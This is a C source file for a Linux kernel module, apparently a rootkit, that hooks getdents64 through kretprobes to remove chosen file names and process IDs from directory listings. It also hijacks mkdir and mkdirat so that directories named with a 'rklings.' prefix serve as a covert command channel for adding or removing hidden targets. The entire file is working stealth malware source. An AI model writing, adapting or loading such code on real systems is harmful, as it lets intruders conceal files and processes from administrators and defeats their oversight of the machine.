// SPDX-License-Identifier: GPL-2.0
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/ptrace.h>
#include <linux/slab.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/uaccess.h>

#define RK_PREFIX     "rklings."
#define RK_PREFIX_LEN 8
#define RK_PATH_MAX   128
#define RK_TARGET_MAX 32
#define RK_NAME_MAX   64

struct rk_target_list {
	spinlock_t lock;
	char targets[RK_TARGET_MAX][RK_NAME_MAX];
	int count;
};

static struct rk_target_list file_targets;
static struct rk_target_list pid_targets;

static int rk_target_add(struct rk_target_list *list, const char *name)
{
	unsigned long flags;
	int ret = 0;

	spin_lock_irqsave(&list->lock, flags);
	if (list->count >= RK_TARGET_MAX) {
		ret = -ENOSPC;
		goto out;
	}
	strscpy(list->targets[list->count], name, RK_NAME_MAX);
	list->count++;
out:
	spin_unlock_irqrestore(&list->lock, flags);
	return ret;
}

static int rk_target_remove(struct rk_target_list *list, int idx)
{
	unsigned long flags;
	int ret = 0;

	spin_lock_irqsave(&list->lock, flags);
	if (idx < 0 || idx >= list->count) {
		ret = -EINVAL;
		goto out;
	}
	if (idx < list->count - 1) {
		memmove(&list->targets[idx], &list->targets[idx + 1],
			(list->count - idx - 1) * RK_NAME_MAX);
	}
	list->count--;
out:
	spin_unlock_irqrestore(&list->lock, flags);
	return ret;
}

static bool rk_target_match(struct rk_target_list *list, const char *name)
{
	unsigned long flags;
	bool found = false;
	int i;

	spin_lock_irqsave(&list->lock, flags);
	for (i = 0; i < list->count; i++) {
		if (strcmp(list->targets[i], name) == 0) {
			found = true;
			break;
		}
	}
	spin_unlock_irqrestore(&list->lock, flags);
	return found;
}

/* ── getdents64 interception ─────────────────────────────────── */

struct rk_getdents_data {
	void __user *ubuf;
};

static bool should_hide_dirent(const char *name)
{
	if (rk_target_match(&file_targets, name))
		return true;
	if (rk_target_match(&pid_targets, name))
		return true;
	return false;
}

static int rk_getdents_entry(struct kretprobe_instance *ri,
			   struct pt_regs *regs)
{
	struct rk_getdents_data *data;
	struct pt_regs *uregs;

	data = (struct rk_getdents_data *)ri->data;

	/* __x64_sys_getdents64 wraps its args in nested pt_regs */
	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 1;

	data->ubuf = (void __user *)uregs->si;
	return 0;
}

static int rk_getdents_return(struct kretprobe_instance *ri,
			    struct pt_regs *regs)
{
	struct rk_getdents_data *data;
	struct linux_dirent64 *d;
	long total, new_total, off;
	char *kbuf;

	data = (struct rk_getdents_data *)ri->data;
	total = regs_return_value(regs);
	if (total <= 0)
		return 0;

	kbuf = kmalloc(total, GFP_KERNEL);
	if (!kbuf)
		return 0;

	if (copy_from_user(kbuf, data->ubuf, total)) {
		kfree(kbuf);
		return 0;
	}

	off = 0;
	new_total = total;
	while (off < new_total) {
		d = (struct linux_dirent64 *)(kbuf + off);
		if (should_hide_dirent(d->d_name)) {
			long remaining = new_total - off - d->d_reclen;

			if (remaining > 0)
				memmove(kbuf + off,
					kbuf + off + d->d_reclen,
					remaining);
			new_total -= d->d_reclen;
		} else {
			off += d->d_reclen;
		}
	}

	if (new_total != total) {
		if (copy_to_user(data->ubuf, kbuf, new_total))
			new_total = -EFAULT;
		regs_set_return_value(regs, new_total);
	}

	kfree(kbuf);
	return 0;
}

static struct kretprobe rk_getdents_probe = {
	.handler        = rk_getdents_return,
	.entry_handler  = rk_getdents_entry,
	.data_size      = sizeof(struct rk_getdents_data),
	.maxactive      = 20,
	.kp.symbol_name = "__x64_sys_getdents64",
};

/* ── mkdir command dispatcher ────────────────────────────────── */

static int rk_dispatch(const char *name)
{
	int idx;

	if (strncmp(name, "h.f.", 4) == 0)
		return rk_target_add(&file_targets, name + 4);
	if (strncmp(name, "u.f.", 4) == 0) {
		if (kstrtoint(name + 4, 10, &idx) == 0)
			return rk_target_remove(&file_targets, idx);
		return -EINVAL;
	}
	if (strncmp(name, "h.i.", 4) == 0)
		return rk_target_add(&pid_targets, name + 4);
	if (strncmp(name, "u.i.", 4) == 0) {
		if (kstrtoint(name + 4, 10, &idx) == 0)
			return rk_target_remove(&pid_targets, idx);
		return -EINVAL;
	}

	return -ENOENT;
}

struct rk_mkdir_data {
	int result;
	bool intercepted;
};

static int rk_mkdir_do_entry(struct kretprobe_instance *inst,
			     const char __user *pathname)
{
	struct rk_mkdir_data *data;
	char buf[RK_PATH_MAX];
	const char *base;
	long copied;

	data = (struct rk_mkdir_data *)inst->data;
	data->intercepted = false;

	copied = strncpy_from_user(buf, pathname, sizeof(buf));
	if (copied <= 0)
		return 0;

	base = strrchr(buf, '/');
	base = base ? base + 1 : buf;

	if (strncmp(base, RK_PREFIX, RK_PREFIX_LEN) != 0)
		return 0;

	data->result = rk_dispatch(base + RK_PREFIX_LEN);
	data->intercepted = true;

	put_user('\0', (char __user *)pathname);
	return 0;
}

static int rk_mkdir_entry_mkdir(struct kretprobe_instance *inst,
				struct pt_regs *regs)
{
	struct pt_regs *uregs;

	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 0;
	return rk_mkdir_do_entry(inst, (const char __user *)uregs->di);
}

static int rk_mkdir_entry_mkdirat(struct kretprobe_instance *inst,
				  struct pt_regs *regs)
{
	struct pt_regs *uregs;

	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 0;
	return rk_mkdir_do_entry(inst, (const char __user *)uregs->si);
}

static int rk_mkdir_return(struct kretprobe_instance *inst,
			    struct pt_regs *regs)
{
	struct rk_mkdir_data *data;

	data = (struct rk_mkdir_data *)inst->data;
	if (data->intercepted)
		regs_set_return_value(regs, (unsigned long)(long)data->result);
	return 0;
}

static struct kretprobe rk_mkdir_probe = {
	.kp.symbol_name = "__x64_sys_mkdir",
	.entry_handler  = rk_mkdir_entry_mkdir,
	.handler        = rk_mkdir_return,
	.data_size      = sizeof(struct rk_mkdir_data),
	.maxactive      = 8,
};

static struct kretprobe rk_mkdirat_probe = {
	.kp.symbol_name = "__x64_sys_mkdirat",
	.entry_handler  = rk_mkdir_entry_mkdirat,
	.handler        = rk_mkdir_return,
	.data_size      = sizeof(struct rk_mkdir_data),
	.maxactive      = 8,
};

/* ── module lifecycle ────────────────────────────────────────── */

static int __init rk_init(void)
{
	int ret;

	spin_lock_init(&file_targets.lock);
	spin_lock_init(&pid_targets.lock);

	ret = register_kretprobe(&rk_getdents_probe);
	if (ret)
		return ret;

	ret = register_kretprobe(&rk_mkdir_probe);
	if (ret)
		goto fail_mkdir;

	ret = register_kretprobe(&rk_mkdirat_probe);
	if (ret)
		goto fail_mkdirat;

	return 0;

fail_mkdirat:
	unregister_kretprobe(&rk_mkdir_probe);
fail_mkdir:
	unregister_kretprobe(&rk_getdents_probe);
	return ret;
}

static void __exit rk_exit(void)
{
	unregister_kretprobe(&rk_mkdirat_probe);
	unregister_kretprobe(&rk_mkdir_probe);
	unregister_kretprobe(&rk_getdents_probe);
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Hide files and PIDs from directory listings");
